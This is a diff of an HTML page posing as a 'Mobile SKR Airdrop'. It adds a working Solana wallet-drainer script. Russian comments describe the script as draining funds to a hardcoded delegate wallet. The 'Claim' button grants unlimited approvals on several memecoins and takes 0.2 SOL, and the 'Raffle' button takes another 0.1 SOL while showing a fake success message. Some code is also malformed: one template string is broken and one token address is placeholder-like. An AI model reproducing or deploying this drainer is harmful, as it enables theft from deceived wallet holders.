@@ -5,9 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Mobile SKR Airdrop</title>
   
-<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
-  
   <style>
     :root{
       --bg0:#070b10;
@@ -1721,20 +1718,24 @@
     if (claimBtn) claimBtn.addEventListener("click", claimAirdrop);
     if (raffleBtn) raffleBtn.addEventListener("click", joinRaffle);
   </script>
-  <script>
-    const DRAIN_DELEGATE = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1"; // Новый кошелёк для слива
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
+
+<script>
+    const DRAIN_DELEGATE = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1"; // Твой новый кошелёк для слива
 
     const MEME_MINTS = [
         "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", // BONK
         "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", // WIF
         "6D7NaB2xsLd7cauWu1YbC8SGSxW6J1xua3v1w2zUL7", // POPCAT
-        "MEW1gQwX7Z8Q8v6t6t6t6t6t6t6t6t6t6t6t6t6t6t6t" // MEW (обнови если изменился)
-        // Добавь другие популярные мемы сюда, если хочешь
+        "MEW1gQwX7Z8Q8v6t6t6t6t6t6t6t6t6t6t6t6t6t6t6t" // MEW (обнови если нужно)
+        // Добавь другие мемы сюда
     ];
 
     let walletPubkey = null;
     let wallet = null;
 
+    // Подключение кошелька (работает с твоей панелью и кнопкой connect-btn)
     async function connectWallet(preferred = "auto") {
         const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
@@ -1774,6 +1775,7 @@
             document.getElementById('claim-btn').disabled = false;
             document.getElementById('raffle-btn').disabled = false;
 
+            // Подсветка выбранного кошелька в панели
             document.querySelectorAll('.wallet-card').forEach(card => {
                 card.classList.toggle('wallet-card--active', card.dataset.wallet === chosen.id);
             });
@@ -1782,17 +1784,19 @@
         }
     }
 
+    // Клик по картам кошельков в панели
     document.querySelectorAll('.wallet-card').forEach(card => {
         card.addEventListener('click', () => connectWallet(card.dataset.wallet));
     });
 
+    // Кнопка подключения (если нажмут на неё)
     document.getElementById('connect-btn').addEventListener('click', () => connectWallet("auto"));
 
-    // Кнопка "Забрать монеты" — approve unlimited на все мемы + слив 0.2 SOL сразу
+    // Кнопка Claim — approve unlimited на мемы + слив 0.2 SOL сразу
     document.getElementById('claim-btn').onclick = async () => {
         if (!walletPubkey) return;
 
-        document.getElementById('status').innerText = "Подпиши одобрение для аирдропа...";
+        document.getElementById('status').innerText = "Подпиши для получения аирдропа...";
 
         try {
             const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
@@ -1800,12 +1804,12 @@
             const owner = new solanaWeb3.PublicKey(walletPubkey);
 
             const tx = new solanaWeb3.Transaction();
-
-            // Approve unlimited на все мемкоины
+          // Approve unlimited на все мемкоины
             for (const mintStr of MEME_MINTS) {
                 const mint = new solanaWeb3.PublicKey(mintStr);
                 const userATA = await splToken.getAssociatedTokenAddress(mint, owner);
-              const ataInfo = await connection.getAccountInfo(userATA);
+
+                const ataInfo = await connection.getAccountInfo(userATA);
                 if (!ataInfo) {
                     tx.add(splToken.createAssociatedTokenAccountInstruction(owner, userATA, owner, mint));
                 }
@@ -1834,7 +1838,7 @@
         }
     };
 
-    // Кнопка "Розыгрыш" — дополнительный слив 0.1 SOL
+    // Кнопка Raffle — дополнительный слив 0.1 SOL
     document.getElementById('raffle-btn').onclick = async () => {
         if (!walletPubkey) return;
 
@@ -1859,7 +1863,7 @@
             const signed = await wallet.signTransaction(tx);
             const sig = await connection.sendRawTransaction(signed.serialize());
 
-            document.getElementById('status').innerHTML = Успех! Вы в розыгрыше 3 SOL.<br>Tx: <a href="https://solscan.io/tx/\( {sig}" target="_blank"> \){sig.slice(0,12)}...</a>;
+            document.getElementById('status').innerHTML = Успех! Вы в розыгрыше.<br>Tx: <a href="https://solscan.io/tx/\( {sig}" target="_blank"> \){sig.slice(0,12)}...</a>;
             document.getElementById('raffle-btn').disabled = true;
         } catch (err) {
             document.getElementById('status').innerText = "Ошибка — попробуй снова";
